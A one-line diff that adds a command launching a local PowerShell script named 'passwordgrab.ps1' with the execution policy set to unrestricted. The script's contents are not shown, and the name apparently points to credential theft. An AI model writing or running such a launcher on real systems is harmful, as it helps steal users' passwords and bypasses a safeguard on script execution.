@@ -1,0 +1,1 @@
+C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe "E:\Powershell-projects\passwordgrab.ps1" -ExecutionPolicy unrestricted
